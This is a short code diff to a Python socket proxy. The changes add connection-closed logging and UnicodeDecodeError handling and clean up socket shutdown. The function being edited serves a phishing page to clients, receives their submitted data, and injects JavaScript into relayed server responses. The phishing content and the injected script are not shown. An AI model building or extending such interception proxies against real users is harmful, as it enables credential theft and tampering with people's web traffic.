@@ -143,6 +143,7 @@ def handle_active_client(client_socket):
         client_socket.send(generate_phishing_page().encode('utf-8'))
         print("Phishing page sent to client.")
         client_socket.close()
+        print("Client connection closed.")
         return
 
      # Handle the GET request with client data
@@ -152,6 +153,7 @@ def handle_active_client(client_socket):
         # Send a simple HTTP response (acknowledgment)
         client_socket.send("HTTP/1.1 200 OK\r\n\r\n".encode('utf-8'))
         client_socket.close()
+        print("Client connection closed.")
         return
 
     print("Request for {} received.".format(host))
@@ -179,7 +181,16 @@ def handle_active_client(client_socket):
         except socket.timeout:
             break
     print(f"Receieved all chunks: {c}")
-    response = response_data.decode('utf-8')
+    
+    try:
+        response = response_data.decode('utf-8')
+    except UnicodeDecodeError:
+        print("UnicodeDecodeError")
+        client_socket.close()
+        server_socket.close()
+        print("Client connection closed.")
+        return
+
     if response:
         #if 'text/html' in response:
         response = inject_javascript(response)
@@ -189,17 +200,11 @@ def handle_active_client(client_socket):
             print("Response is:\n{}".format(response))
     else:
         print("No response received from the server.")
-        client_socket.close()
-        server_socket.close()
 
-    #print("Closing client socket...")
-    #client_socket.close()
-    #server_socket.close()
+    client_socket.close()
+    server_socket.close()
+    print("Client connection closed.")
 
-
-
-
-""""""""""""""""" BELOW OK """""""""""""""""""""
 
 def proxy_active(listening_ip, listening_port):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
